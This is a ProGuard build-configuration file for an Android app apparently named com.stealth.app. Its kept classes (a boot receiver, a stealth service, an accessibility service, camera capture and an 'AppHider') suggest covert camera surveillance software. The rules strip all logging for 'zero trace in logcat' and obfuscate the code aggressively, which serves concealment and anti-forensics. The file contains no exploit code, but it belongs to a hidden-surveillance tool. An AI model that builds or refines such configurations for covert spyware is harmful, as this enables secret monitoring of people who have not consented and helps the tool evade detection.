# proguard-rules.pro

# Keep core Android components
-keep public class com.stealth.app.MainActivity
-keep public class com.stealth.app.BootReceiver
-keep public class com.stealth.app.StealthService
-keep public class com.stealth.app.StealthAccessibilityService
-keep public class com.stealth.app.CameraManager
-keep public class com.stealth.app.AppHider

# Keep Camera2 API classes
-keep class android.hardware.camera2.** { *; }
-keep interface android.hardware.camera2.** { *; }

# Keep callback interfaces
-keep interface com.stealth.app.CameraManager$CaptureCallback { *; }

# Remove all logging — zero trace in logcat
-assumenosideeffects class android.util.Log {
    public static *** v(...);
    public static *** d(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
}

# Aggressive obfuscation
-renamesourcefileattribute SourceFile
-keepattributes SourceFile,LineNumberTable
-repackageclasses 'x'
-allowaccessmodification
-optimizationpasses 5